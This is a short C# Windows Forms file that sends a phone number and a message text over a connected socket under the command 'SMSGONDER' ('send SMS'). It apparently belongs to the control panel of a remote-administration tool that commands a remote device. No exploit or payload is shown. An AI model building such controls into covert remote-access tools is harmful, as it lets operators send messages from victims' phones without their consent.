using System;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class SMS : Form
    {
        Socket s;
        public SMS(Socket socket, string num)
        {
            InitializeComponent();
            s = socket;
            textBox1.Text = num;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text != "" && textBox2.Text != "")
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("SMSGONDER", Encoding.UTF8.GetBytes(textBox1.Text + "=" + textBox2.Text));
                    s.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                    Close();
                }
                catch (Exception) { }
            }
        }
    }
}
